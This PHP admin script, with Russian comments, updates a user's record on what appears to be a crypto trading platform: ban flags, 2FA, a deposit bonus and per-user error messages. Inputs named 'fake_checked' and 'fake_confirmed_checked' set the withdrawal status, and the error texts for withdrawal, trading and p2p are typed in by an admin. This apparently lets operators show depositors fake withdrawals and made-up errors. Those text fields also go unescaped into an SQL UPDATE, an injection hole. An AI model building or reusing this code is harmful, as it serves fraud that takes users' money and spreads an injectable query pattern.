<?php
	# Обновляем информацию о юзере

	
	$user_id = intval($_POST['user_edit_id']);				# user ID [28]
	
	$user = db::super_query("SELECT * FROM `users` WHERE id = '{$user_id}' ORDER BY id DESC", false);

	if(!$user['id']) die('Юзер не найден');	
	
	
	#$password				= $_POST['user_password'];						# 1
	#$email					= $_POST['user_email'];							# 1
	#$phone					= $_POST['user_phone'];							# 1
	

	
	$global_ban				= intval($_POST['global_ban']);					# Global Ban [0,1]
	$chat_ban				= intval($_POST['chat_ban']);					# Chat Ban [0,1]
	$transfer_ban			= intval($_POST['transfer_checked']);			# Transfer Ban [0,1]
	$trading_ban			= intval($_POST['trading_ban']);				# Trading Ban [0,1]
	
	$support_ban			= intval($_POST['support_ban']);				# Support Ban [0,1]
	$invest_ban				= intval($_POST['invest_checked']);				# Invest Ban [0,1]
	$status_2fa				= intval($_POST['status_2fa']);					# Enable 2FA [0,1]
	$chat_enter				= intval($_POST['chat_enter']);					# Allowed to write in chat [0,1]
	
	#$bonus_checked			= intval($_POST['bonus_checked']);				# 1
	$bonusPercentInput		= intval($_POST['bonusPercentInput']);			# 1
	
	
	$withdraw_pending		= intval($_POST['fake_checked']);				# 1
	$withdraw_confirmed		= intval($_POST['fake_confirmed_checked']);		# 1
	
	$withdraw_error			= $_POST['user_error'];							# Текст ошибки вывода
	$trading_error			= $_POST['user_tr_error'];						# Текст ошибки трейдинга
	$chat_error				= $_POST['user_chat_error'];					# Текст ошибки чата
	$p2p_error				= $_POST['user_p2p_error'];						# Текст ошибки p2p
	
	
	 
	
	
	db::query("UPDATE `users` SET 
	
		global_ban = '{$global_ban}',
		chat_ban = '{$chat_ban}',
		trading_ban = '{$trading_ban}',
		support_ban = '{$support_ban}',
		
		transfer_ban = '{$transfer_ban}',
		invest_ban = '{$invest_ban}',
		status_2fa = '{$status_2fa}',
		chat_enter = '{$chat_enter}',
		
		withdraw_pending = '{$withdraw_pending}',
		withdraw_confirmed = '{$withdraw_confirmed}',
		
		first_deposit_bonus = '{$bonusPercentInput}',
		
		withdraw_error = '{$withdraw_error}',
		trading_error = '{$trading_error}',
		chat_error = '{$chat_error}',
		p2p_error = '{$p2p_error}'
		
		
	
	WHERE id = '{$user_id}' ");
	
// echo '<pre style="color: #000">';
// var_dump($_POST);
// echo '</pre>';



	die('1');
	
	
	

	